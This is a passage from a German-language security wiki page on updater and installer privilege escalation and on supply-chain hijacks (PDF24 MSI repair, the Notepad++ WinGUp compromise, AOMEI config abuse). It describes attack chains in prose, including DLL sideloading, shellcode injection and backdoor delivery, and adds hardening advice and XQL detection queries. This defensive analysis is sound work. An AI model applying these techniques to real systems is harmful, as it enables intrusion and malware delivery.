- Dieses Muster lässt sich auf andere Endpoint-Agenten und Updater übertragen, die **temporäre Skripte an für alle beschreibbaren Speicherorten ablegen und sie später als SYSTEM ausführen**. Prüfen Sie auf vorhersehbare Namen, fehlende exklusive Erstellung und Reparatur-/Update-Abläufe, die sich bei Bedarf auslösen lassen.

### Interaktive Installer-Reparatur und privilegierte Konsole

PDF24 Creator 11.15.1 veranschaulicht ein separates MSI-Reparaturrisiko: Seine benutzerdefinierte Druckerinstallationsaktion kann während einer Reparatur eine sichtbare Konsole mit SYSTEM-Rechten starten. Der Hersteller änderte den MSI-Installer in Version 11.15.2, um dieses Verhalten zu beheben. Eine ältere Produktversion ist lediglich ein Ansatzpunkt für die Triage. Prüfen Sie das registrierte oder erreichbare MSI-Paket, ob dieser Benutzer eine Reparatur initiieren kann, ob die anfällige benutzerdefinierte Aktion und die Verzögerung durch die Logdatei vorhanden sind und ob ein interaktiver Desktop die Konsole sichtbar machen kann. Für die gemeldete Verzögerung wurde ein Oplock auf `faxPrnInst.log` verwendet; gewöhnliche Schreibrechte für die Datei sind nicht die einzige Zugriffsvoraussetzung. Eine nicht-interaktive Shell, ein unzugängliches Paket oder ein gepatchter Installer können die Angriffskette unterbrechen. Dieses Problem hängt nicht von `AlwaysInstallElevated` ab und unterscheidet sich vom Austausch eines vorhersehbaren temporären Skripts.

---
## Remote-Supply-Chain-Hijacking durch schwache Updater-Validierung (WinGUp / Notepad++)

Zwischen Juni 2025 und Dezember 2025 lieferten Angreifer, die die Hosting-Infrastruktur hinter dem Notepad++-Updateprozess kompromittiert hatten, gezielt ausgewählten Opfern bösartige Manifeste aus. Ältere WinGUp-basierte Updater verifizierten die Authentizität von Updates nicht vollständig, sodass eine manipulierte XML-Antwort Clients auf von Angreifern kontrollierte URLs umleiten konnte. Da der Client HTTPS-Inhalte akzeptierte, ohne sowohl eine vertrauenswürdige Zertifikatskette als auch eine gültige PE-Signatur des heruntergeladenen Installers zu erzwingen, luden die Opfer ein trojanisiertes NSIS-`update.exe` herunter und führten es aus.<sup>[[12]](#references)[[13]](#references)</sup>

Ablauf im Betrieb (kein lokaler Exploit erforderlich):
1. **Abfangen der Infrastruktur**: CDN/Hosting kompromittieren und Updateprüfungen mit Angreifer-Metadaten beantworten, die auf eine bösartige Download-URL verweisen.
2. **Trojanisiertes NSIS**: Der Installer lädt eine Payload herunter und führt sie aus und missbraucht dabei zwei Ausführungsketten:
   - **Bring-your-own signed binary + sideload**: Die signierte `BluetoothService.exe` von Bitdefender wird eingebunden und eine bösartige `log.dll` in ihrem Suchpfad abgelegt. Beim Start der signierten Binärdatei lädt Windows `log.dll` per Sideload, die die Chrysalis-Backdoor entschlüsselt und per Reflective Loading lädt (durch Warbird geschützt und mit API-Hashing zur Erschwerung der statischen Erkennung).
   - **Skriptgesteuerte Shellcode-Injektion**: NSIS führt ein kompiliertes Lua-Skript aus, das Win32-APIs (z. B. `EnumWindowStationsW`) verwendet, um Shellcode zu injizieren und Cobalt Strike Beacon bereitzustellen.<sup>[[12]](#references)</sup>

Maßnahmen zur Härtung und Erkennung für alle Auto-Updater:
- **Zertifikats- und Signaturprüfung** des heruntergeladenen Installers erzwingen (Signierer des Herstellers festlegen, nicht übereinstimmenden CN/Zertifikatsketten ablehnen) und das Update-Manifest selbst signieren (z. B. mit XMLDSig). Durch das Manifest gesteuerte Weiterleitungen blockieren, sofern sie nicht validiert wurden.
- **BYO-Signatur-Binärdatei-Sideloading** als Erkennungspivot nach dem Download behandeln: Alarmieren, wenn eine signierte Hersteller-EXE eine DLL mit einem Namen außerhalb ihres kanonischen Installationspfads lädt (z. B. wenn Bitdefender `log.dll` aus Temp/Downloads lädt) und wenn ein Updater Installer mit nicht vom Hersteller stammenden Signaturen aus einem temporären Verzeichnis ablegt oder ausführt.
- **Malwarespezifische Artefakte** überwachen, die in dieser Angriffskette beobachtet wurden (als allgemeine Erkennungspivots nützlich): Mutex `Global\Jdhfv_1.0.1`, ungewöhnliche Schreibvorgänge von `gup.exe` nach `%TEMP%` und Lua-gesteuerte Shellcode-Injektionsstufen.
- Notepad++ reagierte darauf, indem es WinGUp ab Version 8.8.9 verstärkte: Das zurückgegebene XML ist nun signiert (XMLDSig), und neuere Builds erzwingen die Zertifikats- und Signaturprüfung des heruntergeladenen Installers, statt allein dem Transport zu vertrauen.<sup>[[13]](#references)</sup>

<details>
<summary>Cortex XDR XQL – Sideloading von <code>log.dll</code> durch eine von Bitdefender signierte EXE (T1574.001)</summary>

```sql
// Identifies Bitdefender-signed processes loading log.dll outside vendor paths
config case_sensitive = false
| dataset = xdr_data
| fields actor_process_signature_vendor, actor_process_signature_product, action_module_path, actor_process_image_path, actor_process_image_sha256, agent_os_type, event_type, event_id, agent_hostname, _time, actor_process_image_name
| filter event_type = ENUM.LOAD_IMAGE and agent_os_type = ENUM.AGENT_OS_WINDOWS
| filter actor_process_signature_vendor contains "Bitdefender SRL" and action_module_path contains "log.dll"
| filter actor_process_image_path not contains "Program Files\\Bitdefender"
| filter not actor_process_image_name in ("eps.rmm64.exe", "downloader.exe", "installer.exe", "epconsole.exe", "EPHost.exe", "epintegrationservice.exe", "EPPowerConsole.exe", "epprotectedservice.exe", "DiscoverySrv.exe", "epsecurityservice.exe", "EPSecurityService.exe", "epupdateservice.exe", "testinitsigs.exe", "EPHost.Integrity.exe", "WatchDog.exe", "ProductAgentService.exe", "EPLowPrivilegeWorker.exe", "Product.Configuration.Tool.exe", "eps.rmm.exe")
```

</details>

<details>
<summary>Cortex XDR XQL – <code>gup.exe</code> startet einen Installer, der nicht zu Notepad++ gehört</summary>

```sql
config case_sensitive = false
| dataset = xdr_data
| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START and _product = "XDR agent" and _vendor = "PANW"
| filter lowercase(actor_process_image_name) = "gup.exe" and actor_process_signature_status not in (null, ENUM.UNSUPPORTED, ENUM.FAILED_TO_OBTAIN ) and action_process_signature_status not in (null, ENUM.UNSUPPORTED, ENUM.FAILED_TO_OBTAIN )
| filter lowercase(action_process_image_name) ~= "(npp[\.\d]+?installer)"
| filter action_process_signature_status != ENUM.SIGNED or lowercase(action_process_signature_vendor) != "notepad++"
```

</details>

Diese Muster lassen sich auf alle Aktualisierungsprogramme übertragen, die unsignierte Manifeste akzeptieren oder die Signatur des Installers nicht zuverlässig prüfen: Netzwerk-Hijacking + bösartiger Installer + BYO-signed Sideloading ermöglichen remote code execution unter dem Deckmantel „vertrauenswürdiger“ Updates.

### Benachrichtigungskonfiguration als zweiter Update-Auslöser

Ein Aktualisierungsprogramm kann separate Remote-Konfigurationen verwenden, um **Inhalte bereitzustellen und deren Ausführung auszulösen**. Dafür muss der Angreifer die Konfigurationen oder deren Antworten kontrollieren; aus den Berichten geht nicht hervor, wie der Zugriff auf den Ursprung erlangt wurde. Im AOMEI-Fall legte `down_html.ini` eine Archiv-URL, eine Version (`thrid`) und einen MD5-Hash (`Val`) fest; der Angreifer erhöhte die Version und änderte gleichzeitig die URL und den dazu passenden Prüfsummenwert. Dies ist der oben beschriebene [Fehler an der Vertrauensgrenze von Metadaten](#2-hijacking-the-update-channel-to-run-code-as-system). Der zusätzliche Ausführungspfad war `Notifycfg.ini`: Sie wies `ABNotify.exe` an, eine extrahierte `upgrade-now.html` über eine lokale `file:///`-URL in einer WebView zu laden. Die Seite navigierte automatisch zu einer danebenliegenden ausführbaren Datei, die die WebView an die System-Shell übergab. Der untergeordnete Prozess erbte die Berechtigungen des Benachrichtigungsprogramms; dadurch erhielt er nicht automatisch SYSTEM-Berechtigungen.<sup>[[17]](#references)[[18]](#references)</sup>

Google meldete außerdem eine manipulierte `Notifycfg.ini` mit mehr als 35.000 wiederholten Dummy-Abschnitten, die die normale Versionsprüfung dieses Clients umging. Der Bericht belegt keinen allgemeinen Parser-Bypass. Der Angreifer stellte die Remote-Dateien nach Zeitfenstern von fünf bis zehn Minuten wieder her, sodass nur Clients, die innerhalb dieser Zeitfenster die Konfiguration abriefen, die geänderte Version erhielten. Über diesen Benachrichtigungskanal wurde auch ein separater [WebDAV/NTLM-Köder zur Erzwingung einer Authentifizierung](../ntlm/places-to-steal-ntlm-creds.md#remote-notification-uris-for-webdav-ntlm-coercion) verbreitet, für den das Archiv nicht ausgeführt werden musste.<sup>[[18]](#references)</sup>

---
## References
- [1] [Sicherheitshinweis – Netskope Client für Windows – lokale Rechteausweitung über einen Rogue-Server (CVE-2025-0309)](https://blog.amberwolf.com/blog/2025/august/advisory---netskope-client-for-windows---local-privilege-escalation-via-rogue-server/)
- [2] [Netskope-Sicherheitshinweis NSKPSA-2025-002](https://www.netskope.com/resources/netskope-resources/netskope-security-advisory-nskpsa-2025-002)
- [3] [NachoVPN – Netskope-Plugin](https://github.com/AmberWolfCyber/NachoVPN)
- [4] [UpSkope – Netskope-IPC-Client/Exploit](https://github.com/AmberWolfCyber/UpSkope)
- [5] [NVD – CVE-2025-0309](https://nvd.nist.gov/vuln/detail/CVE-2025-0309)
- [6] [SensePost – ASUS DriverHub, MSI Center, Acer Control Centre und Razer Synapse 4 kompromittieren](https://sensepost.com/blog/2025/pwning-asus-driverhub-msi-center-acer-control-centre-and-razer-synapse-4/)
- [7] [0xdf – HTB: NanoCorp](https://0xdf.gitlab.io/2026/06/20/htb-nanocorp.html)
- [8] [SEC Consult – Lokale Rechteausweitung über beschreibbare Dateien im Checkmk Agent](https://sec-consult.com/vulnerability-lab/advisory/local-privilege-escalation-via-writable-files-in-checkmk-agent/)
- [9] [Checkmk Werk #16361 – Rechteausweitung im Windows-Agent](https://checkmk.com/werk/16361)
- [10] [sensepost/bloatware-pwn PoCs](https://github.com/sensepost/bloatware-pwn)
- [11] [CyberArk PipeViewer](https://github.com/cyberark/PipeViewer)
- [12] [Unit 42 – Staatliche Akteure nutzen die Notepad++-Lieferkette aus](https://unit42.paloaltonetworks.com/notepad-infrastructure-compromise/)
- [13] [Notepad++ – Update zum Vorfall mit der gekaperten Infrastruktur](https://notepad-plus-plus.org/news/hijacked-incident-info-update/)
- [14] [AmberWolf – Umgehung der Fehlerbehebung für CVE-2025-0309 im Netskope Client für Windows](https://blog.amberwolf.com/blog/2026/march/patch-bypass---netskope-client-for-windows---local-privilege-escalation-via-rogue-server/)
- [15] [Atredis – Aufdeckung von Fehlern zur Rechteausweitung in Lenovo Vantage](https://www.atredis.com/blog/2025/7/7/uncovering-privilege-escalation-bugs-in-lenovo-vantage)
- [16] [Quarkslab – MyReport Updater: Von gRPC zu SYSTEM](https://blog.quarkslab.com/myreport-updater-from-grpc-to-system.html)
- [17] [ManageEngine Threat Analysis Lab – Kompromittierung der AOMEI-Backupper-Lieferkette](https://www.manageengine.com/threat-analysis-lab/aomei-backupper-supply-chain-compromise.html)
- [18] [Google Threat Intelligence Group und Mandiant – Untersuchung kurzzeitiger Manipulationen der Lieferkette](https://cloud.google.com/blog/topics/threat-intelligence/investigating-ephemeral-supply-chain-tampering)
